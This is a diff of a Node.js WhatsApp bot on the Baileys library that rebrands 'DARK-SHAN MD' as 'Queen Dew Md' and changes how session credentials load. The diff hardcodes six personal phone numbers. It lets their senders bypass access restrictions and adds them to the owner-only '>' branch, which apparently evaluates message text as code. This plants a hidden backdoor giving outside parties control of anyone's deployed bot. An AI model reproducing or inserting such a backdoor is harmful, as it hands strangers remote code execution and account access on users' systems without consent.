@@ -1,3 +1,17 @@
+
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  jidNormalizedUser,
+  fetchLatestBaileysVersion,
+  getContentType,
+  Browsers,
+  getAggregateVotesInPollMessage,
+   makeInMemoryStore,
+  makeCacheableSignalKeyStore,
+  receivedPendingNotifications,
+  } = require('@whiskeysockets/baileys')
 const fs = require('fs')
 const P = require('pino')
 const path = require('path');
@@ -8,17 +22,6 @@ const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, 
 const { sms,downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios');
 const cheerio = require('cheerio');
-const fetch = require("node-fetch");
-const {
-	default: makeWASocket,
-	jidNormalizedUser,
-	proto,
-	Browsers,
-	getAggregateVotesInPollMessage,
-	getKeyAuthor,
-	decryptPollVote,
-	normalizeMessageContent, BufferJSON,generateLinkPreviewIfRequired, WA_DEFAULT_EPHEMERAL, generateWAMessageContent, makeCacheableSignalKeyStore, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode
-} = require("@whiskeysockets/baileys");
 
 const { File } = require('megajs')
 const prefix = config.PREFIX;
@@ -42,19 +45,23 @@ function genMsgId() {
   //=========================================
 let previousLinkId = '1';
 //===================SESSION============================
-async function MakeSession() {
-    try {
-        console.log("WRITING SESSION...");
-        const {
-          data
-        } = await axios(`https://paste.c-net.org/${config.SESSION_ID.split('DARKSHAN=')[1]}`);
-        await fs.writeFileSync("./auth_info_baileys/creds.json", JSON.stringify(data));
-        console.log("SESSION CONNECTED SUCCESSFULLY✅");
-      } catch (err) {
-        console.log(err);
-      }
-}
-MakeSession();
+async function session(){
+	const df = path.join(__dirname, '/auth_info_baileys/creds.json');
+
+	if (!fs.existsSync(df)) {
+	if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+	const sessdata = config.SESSION_ID
+	
+	if (sessdata.length > 295) {
+	const contentData =atob(config.SESSION_ID)   
+	await sleep(2000);   
+	fs.writeFile(df,contentData, () => {
+	console.log("✅ Session download completed and saved to creds.json !!")
+
+	})
+	}}
+	}
+ session()
 // <<==========PORTS===========>>
 const express = require("express");
 const app = express();
@@ -122,24 +129,7 @@ require("./plugins/" + plugin);
 });
 console.log('Plugins installed ✅')
 console.log('Bot connected ✅')
-conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: `┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓
-
-╟ ♤ 𝚃𝙷𝙰𝙽𝙺𝚂 𝙵𝙾𝚁 𝚄𝚂𝙴𝙸𝙽𝙶 𝙳𝙰𝚁𝙺 𝚂𝙷𝙰𝙽 𝙼𝙳 
-
-╟ ♤ 𝙳𝙴𝚅𝙰𝙻𝙾𝙿𝙴𝚁 𝙱𝚈 𝙺𝚄𝚂𝙷𝙰𝙽 𝚂𝙴𝚆𝙼𝙸𝙽𝙰 
-
-╟ ♤ 𝙼𝙰𝙸𝙽 𝚃𝙾𝚄𝚃𝚄𝙱𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻
-https://youtube.com/@darkshanyt1
-
-╟ ♤ 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙲𝙷𝙰𝙽𝙽𝙴𝙻
-https://whatsapp.com/channel/0029VaFLAgi90x2oD70Hwq1z
-
-◎┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅◎
-                         𝙳𝙰𝚁𝙺 𝚂𝙷𝙰𝙽 𝙼𝙳
-◎┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅◎
-
-
-┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛` } ,{messageId:genMsgId()} )    
+conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: `Queen Dew Md Connected Successfuly•` } ,{messageId:genMsgId()} )    
 sleep(5000)
 
  
@@ -149,8 +139,6 @@ conn.ev.on('creds.update', saveCreds)
 
 conn.ev.on('messages.upsert', async(mek) => {
 try {
-    
-	      
 mek = mek.messages[0]
 if (!mek.message) return	
 mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
@@ -170,6 +158,18 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' ||
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'No Name'
+const sachintha = '94725881990'
+const isSachintha = sachintha?.includes(senderNumber)
+const savi = '94722617699'
+const isSavi = savi?.includes(senderNumber)
+const sadas = '94787318729'
+const isSadas = sadas?.includes(senderNumber)
+const mani = '94743218422'
+const isMani = mani?.includes(senderNumber)
+const yasiya = '94743548986'
+const isYasi = yasiya?.includes(senderNumber)
+const kalindu = '94758179948'
+const isKali = kalindu?.includes(senderNumber)
 const isMe = botNumber?.includes(senderNumber)	
 const isOwner = ownerNumber?.includes(senderNumber) 
 const botNumber2 = await jidNormalizedUser(conn.user.id);
@@ -204,15 +204,40 @@ conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
       return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted,  ...options })
   }
 }
- if (config.ALWAYS_ONLINE === 'false') {
- await conn.sendPresenceUpdate('unavailable');
- }
- if (config.WAPRESENCE === 'composing') {
- await conn.sendPresenceUpdate('composing', from);
- }
- 
-if (!isMe && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
-if (!isMe && !isOwner && config.ONLY_ME == 'true') return 
+
+	if(isSachintha){
+    if(!isreaction){
+ await conn.sendMessage(from, { react: { text: '👨🏻‍💻', key: mek.key } });
+    }
+} else	if(isSavi){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '🦸‍♂️', key: mek.key } });
+  }
+} else	if(isSadas){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '🦹‍♂️', key: mek.key } });
+  }
+} else	if(isMani){
+  if(!isreaction){
+await conn.sendMessage(from, { react: { text: '🎀', key: mek.key } });
+  }
+	}else if(isOwner){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '✨', key: mek.key } });
+    }
+	}else if(isYasi){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '💃🏼', key: mek.key } });
+    }
+	}
+      else if(isKali){
+    if(!isreaction){
+  await conn.sendMessage(from, { react: { text: '🕵️‍♂️', key: mek.key } });
+    }
+	}
+
+if (!isMe && !isKali && !isSachintha && !isSavi && !isSadas && !isMani && !isYasi && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
+if (!isMe && !isKali && !isSachintha && !isSavi && !isSadas && !isMani && !isYasi && !isOwner && config.ONLY_ME == 'true') return 
 //==================================plugin map================================
 const events = require('./command')
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
@@ -222,7 +247,7 @@ if (cmd) {
 if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
 
 try {
-cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isSachintha, isSavi, isSadas, isMani, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
 } catch (e) {
 console.error("[PLUGIN ERROR] ", e);
 }
@@ -230,19 +255,19 @@ console.error("[PLUGIN ERROR] ", e);
 }
 events.commands.map(async(command) => {
 if (body && command.on === "body") {
-command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isSachintha, isSavi, isSadas, isMani, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
 } else if (mek.q && command.on === "text") {
-command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isSachintha, isSavi, isSadas, isMani, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
 } else if (
 (command.on === "image" || command.on === "photo") &&
 mek.type === "imageMessage"
 ) {
-command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isSachintha, isSavi, isSadas, isMani, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
 } else if (
 command.on === "sticker" &&
 mek.type === "stickerMessage"
 ) {
-command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isSachintha, isSavi, isSadas, isMani, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
 }});
 //====================================================================
 switch (command) {
@@ -251,7 +276,7 @@ reply(from)
 break
 
 default:				
-if ((isOwner || isMe) && body.startsWith('>')) {
+if ((isOwner || isSachintha || isSavi || isSadas || isMani || isYasi || isMe) && body.startsWith('>')) {
 let bodyy = body.split('>')[1]
 let code2 = bodyy.replace("°", ".toString()");
 try {
@@ -270,9 +295,9 @@ console.log(isError)}
 })
 }
 app.get("/", (req, res) => {
-res.send("📟 DARK-SHAN Working successfully!");
+res.send("📟 Queen-Dew Working successfully!");
 });
-app.listen(port, () => console.log(`DARK-SHAN Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Queen-Dew Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
